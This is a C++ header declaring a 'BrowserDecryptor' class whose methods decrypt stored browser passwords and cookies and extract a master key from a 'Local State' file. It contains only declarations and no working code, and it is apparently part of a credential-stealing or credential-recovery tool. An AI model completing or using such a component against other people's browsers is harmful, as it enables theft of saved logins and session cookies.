#ifndef BROWSER_DECRYPTOR_H
#define BROWSER_DECRYPTOR_H

#include <string>
#include <vector>

class BrowserDecryptor {
public:
    static std::vector<std::string> DecryptPasswords(const std::string& dbPath);
    static std::vector<std::string> DecryptCookies(const std::string& dbPath);
    static std::string ExtractMasterKey(const std::string& localStatePath);
};

#endif
